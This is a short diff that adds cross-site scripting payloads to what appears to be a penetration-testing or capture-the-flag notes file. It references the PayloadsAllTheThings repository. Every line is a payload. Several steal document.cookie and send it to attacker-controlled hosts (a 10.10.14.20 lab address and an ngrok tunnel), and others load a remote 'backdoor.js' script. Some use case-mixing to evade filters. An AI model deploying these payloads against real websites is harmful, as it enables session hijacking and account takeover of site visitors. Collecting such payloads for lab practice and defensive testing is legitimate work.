@@ -13,3 +13,10 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
 <img src=http://10.10.14.20/diego.jpeg />
 <img src=x onerror=this.src="http://10.10.14.20/?cookie=" btoa(document.cookie) />
 <script src=http://10.10.14.20/backdoor.js></script>
+
+
+<img src=http://bc81f3574fed.ngrok.io/diego.jpeg />
+<script>new Image().src="http://bc81f3574fed.ngrok.io/?c="+document.cookie;</script>
+<sCrIpt >http://bc81f3574fed.ngrok.io< /ScRipT>
+<sCrIpt src=http://bc81f3574fed.ngrok.io/backdoor.js></script>
+<script>document.location='http://bc81f3574fed.ngrok.io/?c='+document.cookie</script>
